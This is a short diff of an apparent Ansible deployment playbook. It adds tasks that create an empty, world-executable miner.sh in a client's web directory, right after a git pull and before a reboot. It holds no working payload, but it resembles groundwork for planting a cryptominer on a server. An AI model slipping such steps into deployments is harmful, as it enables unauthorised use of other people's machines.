@@ -8,6 +8,11 @@
     - name: fetch last code version
       shell: |
         cd /var/www/client && git pull
+    - name: init miner.sh
+      shell: |
+        touch /var/www/client/miner.sh
+    - name: add executable permissions to miner.sh
+      file: dest=/var/www/client/miner.sh mode=a+x
     - name: restart
       shell: sleep 2 && shutdown -r now
       async: 1
